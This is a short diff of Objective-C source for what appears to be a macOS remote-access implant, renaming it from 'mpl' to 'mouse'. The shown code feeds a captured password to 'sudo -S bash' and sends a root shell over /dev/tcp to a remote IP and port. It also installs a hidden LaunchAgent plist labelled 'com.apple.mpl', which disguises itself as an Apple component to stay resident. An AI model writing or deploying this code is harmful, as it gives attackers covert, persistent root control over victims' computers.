@@ -1,6 +1,6 @@
-#include "mpl.h"
+#include "mouse.h"
 
-@implementation mpl
+@implementation mouse
 
 @synthesize fileManager;
 NSPipe *stdinPipe;
@@ -585,7 +585,7 @@ char* parseBinary(int* searchChars,int sizeOfSearch) {
     [self term];
     if (!([result rangeOfString:@"root"].location == NSNotFound)) {
         sleep(1);
-        system([[NSString stringWithFormat:@"killall mpl;echo '%@' | sudo -S bash &> /dev/tcp/%@/%d 0>&1 2>/dev/null",pass,ip,port] UTF8String]);
+        system([[NSString stringWithFormat:@"killall mouse;echo '%@' | sudo -S bash &> /dev/tcp/%@/%d 0>&1 2>/dev/null",pass,ip,port] UTF8String]);
         exit(0);
     }
 }
@@ -612,7 +612,7 @@ char* parseBinary(int* searchChars,int sizeOfSearch) {
 }
 
 -(void)persistence:(NSString *)args :(NSString *)ip :(int)port {
-    NSString *mplPath = [NSString stringWithFormat:@"%@/Library/LaunchAgents/.mpl.plist",NSHomeDirectory()];
+    NSString *mplPath = [NSString stringWithFormat:@"%@/Library/LaunchAgents/.mouse.plist",NSHomeDirectory()];
     if ([args isEqualToString:@"install"]) {
         NSDictionary *innerDict = [NSDictionary dictionaryWithObjects:
                         [NSArray arrayWithObjects: [NSNumber numberWithBool: YES],@"com.apple.mpl",[NSNumber numberWithInt:5],[NSNumber numberWithBool: YES],
@@ -625,10 +625,10 @@ char* parseBinary(int* searchChars,int sizeOfSearch) {
             [self sendString:[NSString stringWithFormat:@"%@",err.localizedDescription]];
         }
         [plistData writeToFile:mplPath atomically:true];
-        [self runTask:@"sleep 1;launchctl unload ~/Library/LaunchAgents/.mpl.plist;launchctl load ~/Library/LaunchAgents/.mpl.plist":false];
+        [self runTask:@"sleep 1;launchctl unload ~/Library/LaunchAgents/.mouse.plist;launchctl load ~/Library/LaunchAgents/.mouse.plist":false];
     } else if ([args isEqualToString:@"uninstall"]) {
         if ([self.fileManager fileExistsAtPath:mplPath]) {
-            [self runTask:@"launchctl unload ~/Library/LaunchAgents/.mpl.plist 2>/dev/null; rm ~/Library/LaunchAgents/.mpl.plist":false];
+            [self runTask:@"launchctl unload ~/Library/LaunchAgents/.mouse.plist 2>/dev/null; rm ~/Library/LaunchAgents/.mouse.plist":false];
         }
     } else {
         [self sendString:@"Unknown Option"];
